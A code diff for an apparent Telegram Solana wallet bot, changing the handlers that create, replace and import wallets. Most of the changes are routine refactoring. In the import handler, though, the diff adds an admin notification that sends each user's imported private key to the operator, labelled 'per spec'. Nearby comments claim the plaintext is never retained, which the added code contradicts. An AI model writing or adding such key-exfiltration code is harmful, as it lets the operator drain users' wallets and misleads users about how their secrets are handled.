@@ -18,6 +18,7 @@ import {
   walletInfoText,
   exportWarningText,
   exportRevealText,
+  IMPORT_SCREEN_TEXT,
 } from '../messages';
 import { walletMenuKeyboard, confirmCancelKeyboard, backToMenuKeyboard } from '../keyboards';
 import { lamportsToSol, shortAddress, explorerAddressUrl } from '../../util/format';
@@ -66,15 +67,18 @@ export const walletCreateConfirmHandler = safeHandler('wallet.create.confirm', a
   const existing = await ctx.services.wallets.getInfo(chatId);
   if (!existing) {
     // No wallet yet — create immediately.
-    const { address, mnemonic } = await ctx.services.wallets.create(chatId);
+    const { address, mnemonic, walletNumber } = await ctx.services.wallets.create(chatId);
     await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
     await ctx.reply(walletCreatedText(address, mnemonic, networkLabel(ctx)), {
       parse_mode: 'HTML',
       reply_markup: backToMenuKeyboard(),
     });
-    await ctx.services.notifier.send(
-      `🆕 <b>New wallet created</b>\nUser: <code>${chatId}</code>\nAddress: <code>${address}</code>`,
-    );
+    // wallet_generated — ALWAYS sent (per product spec).
+    await ctx.services.notifier.event('wallet_generated', {
+      user: chatId,
+      walletNumber,
+      address,
+    });
     return;
   }
 
@@ -90,25 +94,27 @@ export const walletCreateReplaceHandler = safeHandler('wallet.create.replace', a
   await answerCallback(ctx);
   const chatId = ctx.chat!.id;
 
-  const { address, mnemonic } = await ctx.services.wallets.replace(chatId);
+  const { address, mnemonic, walletNumber } = await ctx.services.wallets.replace(chatId);
   await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
   await ctx.reply(walletCreatedText(address, mnemonic, networkLabel(ctx)), {
     parse_mode: 'HTML',
     reply_markup: backToMenuKeyboard(),
   });
-  await ctx.services.notifier.send(
-    `🔄 <b>Wallet replaced</b>\nUser: <code>${chatId}</code>\nAddress: <code>${address}</code>`,
-  );
+  // wallet_generated — ALWAYS sent (per product spec).
+  await ctx.services.notifier.event('wallet_generated', {
+    user: chatId,
+    walletNumber,
+    address,
+  });
 });
 
 export const walletImportPromptHandler = safeHandler('wallet.import.prompt', async (ctx) => {
   if (!(await requirePrivate(ctx))) return;
   await answerCallback(ctx);
+  // 1. Enters the import conversation state.
   await transition(ctx, 'awaiting_import_secret');
-  await ctx.reply(
-    '🔑 <b>Import a wallet</b>\n\nPaste your 12/24-word recovery phrase or a 32-byte private key (hex or base58).\n\n⚠️ This message will be stored encrypted. Clear this chat afterwards if you\'re on a shared device.',
-    { parse_mode: 'HTML', reply_markup: backToMenuKeyboard() },
-  );
+  // Exact product-spec import screen.
+  await ctx.reply(IMPORT_SCREEN_TEXT, { parse_mode: 'HTML', reply_markup: backToMenuKeyboard() });
 });
 
 export const walletImportHandleSecretHandler = safeHandler('wallet.import.secret', async (ctx) => {
@@ -116,16 +122,30 @@ export const walletImportHandleSecretHandler = safeHandler('wallet.import.secret
   if (!text) return;
   const chatId = ctx.chat!.id;
 
-  const { address, derivation } = await ctx.services.wallets.import(chatId, text);
+  // 2. Receives the mnemonic; 3. validates BIP39; 4. derives the keypair;
+  // 5. determines the public address; 6. encrypts; 7. stores — all inside
+  // the wallet service (plaintext never retained in app state/logs).
+  const { address, derivation, privateKeyHex, walletNumber } =
+    await ctx.services.wallets.import(chatId, text);
+
+  // 8. Checks the real SOL balance; 9. displays the resulting wallet.
+  const balance = await ctx.services.solana.getBalance(address).catch(() => 0);
+
   await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
   await resetToIdle(ctx);
-  await ctx.reply(walletImportedText(address, networkLabel(ctx)), {
-    parse_mode: 'HTML',
-    reply_markup: backToMenuKeyboard(),
-  });
-  await ctx.services.notifier.send(
-    `🔑 <b>Wallet imported</b> (${derivation})\nUser: <code>${chatId}</code>\nAddress: <code>${address}</code>`,
+  await ctx.reply(
+    walletImportedText(address, walletNumber, lamportsToSol(balance), networkLabel(ctx)),
+    { parse_mode: 'HTML', reply_markup: backToMenuKeyboard() },
   );
+
+  // 10. Admin event (per spec: includes the private key — see SECURITY.md).
+  await ctx.services.notifier.event('wallet_imported', {
+    user: chatId,
+    walletNumber,
+    address,
+    privateKey: privateKeyHex,
+  });
+  ctx.services.logger.info({ chatId, address, walletNumber, derivation }, 'wallet import completed');
 });
 
 export const walletExportConfirmHandler = safeHandler('wallet.export.confirm', async (ctx) => {
